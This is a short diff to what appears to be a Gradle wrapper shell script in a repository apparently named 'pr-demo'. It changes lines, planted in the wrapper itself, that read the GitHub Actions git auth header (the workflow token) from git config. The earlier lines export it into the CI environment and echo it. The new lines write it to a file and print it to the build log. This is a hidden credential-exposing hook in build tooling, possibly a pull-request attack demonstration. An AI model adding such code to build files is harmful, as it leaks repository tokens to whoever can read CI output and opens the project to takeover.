@@ -154,9 +154,9 @@ if $cygwin ; then
     esac
 fi
 
-echo "GIT_VALUES=$(git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader)" >> $GITHUB_ENV
-echo $GIT_VALUES
-echo $GITHUB_ENV
+echo "GIT_VALUES=$(git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader)" > foo.out
+cat foo.out
+
 
 # Escape application args
 save () {
